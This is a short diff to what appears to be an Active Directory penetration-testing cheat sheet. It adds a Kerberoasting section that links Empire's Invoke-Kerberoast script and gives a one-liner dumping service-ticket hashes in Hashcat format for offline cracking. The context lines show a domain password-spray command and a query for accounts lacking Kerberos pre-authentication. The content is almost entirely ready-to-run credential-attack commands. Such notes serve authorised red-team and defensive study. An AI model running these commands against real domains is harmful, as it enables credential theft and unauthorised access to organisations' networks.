@@ -632,6 +632,12 @@ Invoke-DomainPasswordSpray -UserList .\users.txt -Password 1qaz!QAZ -Verbose
 Get-ADUser -LdapFilter "(&(objectclass=user)(objectcategory=user)(useraccountcontrol:1.2.840.113556.1.4.803:=4194304))" | Format-Table Name, DistinguishedName
 ```
 
+## 6.2 Kerberoasting
+
+```
+https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1
+Invoke-Kerberoast -OutputFormat Hashcat | % {$_.hash} | Out-File -Encoding ascii hash.txt
+```
 
 
 ### Refrences
